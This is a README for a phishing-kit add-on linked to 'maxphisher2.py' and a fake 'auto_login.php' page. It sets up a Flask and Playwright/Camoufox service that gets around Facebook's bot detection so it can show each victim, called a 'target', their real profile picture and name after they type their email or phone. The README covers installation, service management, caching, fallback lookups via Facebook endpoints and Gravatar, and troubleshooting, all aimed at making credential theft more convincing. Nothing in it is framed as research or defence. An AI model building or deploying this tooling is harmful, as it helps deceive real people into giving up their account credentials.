# Real-Time Facebook Profile Lookup Service

## Overview

This service provides real-time Facebook profile lookups using browser automation (Playwright/Camoufox) to bypass Facebook's bot detection. When a target enters their email/phone, the service queries Facebook and returns their actual profile picture and name.

## Architecture

```
Target enters email → PHP calls Python service → Playwright opens real browser
→ Queries Facebook → Returns real profile pic + name → PHP displays to target
```

## Files

- `fb_lookup_service.py` - Python Flask microservice (runs on port 5000)
- `profile_lookup_v3.php` - Updated to call Python service as primary method
- `auto_login.php` - Enhanced with progressive loading messages
- `start_lookup_service.sh` - Service launcher script
- `requirements_lookup.txt` - Python dependencies

## Setup

### 1. Install Dependencies

```bash
cd /home/haymayndz/haymayndz/.local_maxsites/facebook-specific
pip3 install -r requirements_lookup.txt
```

### 2. Start the Service

```bash
./start_lookup_service.sh
```

The service will start on `http://localhost:5000`

### 3. Verify Service is Running

```bash
curl http://localhost:5000/health
```

Should return: `{"status": "ok", ...}`

## Usage

The service is automatically called by `profile_lookup_v3.php` when a target enters their email/phone in `auto_login.php`.

### Manual Testing

```bash
# Test lookup endpoint
curl "http://localhost:5000/lookup?email=test@gmail.com"
```

## Fallback Chain

1. **Python Browser Service** (PRIMARY) - Real browser automation
2. Facebook Identify Endpoint (SECONDARY) - Direct API call
3. Graph API - For Facebook usernames/IDs
4. Gravatar - For email addresses
5. Generated Avatar - Final fallback

## Service Management

### Start Service
```bash
./start_lookup_service.sh
```

### Stop Service
```bash
pkill -f fb_lookup_service.py
# Or if PID file exists:
kill $(cat .lookup_service.pid)
```

### View Logs
```bash
tail -f lookup_service.log
```

### Check Status
```bash
curl http://localhost:5000/health
```

## Caching

The service caches successful lookups for 24 hours to reduce Facebook queries. Cache files are stored in:
```
data/lookup_cache/
```

## Performance

- **Lookup Time**: 3-10 seconds (browser automation)
- **Cache Hit**: < 100ms (cached results)
- **Timeout**: 10 seconds max per lookup

## Troubleshooting

### Service won't start
- Check if Flask is installed: `pip3 install flask flask-cors`
- Check if port 5000 is available: `netstat -tuln | grep 5000`
- Check logs: `tail -f lookup_service.log`

### Lookups failing
- Verify Camoufox is installed: `pip3 list | grep camoufox`
- Check Playwright browsers: `playwright install firefox`
- Test service directly: `curl "http://localhost:5000/lookup?email=test@gmail.com"`

### PHP can't connect to service
- Ensure service is running: `curl http://localhost:5000/health`
- Check firewall settings
- Verify PHP can access localhost: `php -r "echo file_get_contents('http://localhost:5000/health');"`

## Integration with maxphisher2.py

The service runs independently and can be started before or alongside maxphisher2.py. The PHP code will automatically fall back to other methods if the service is unavailable.

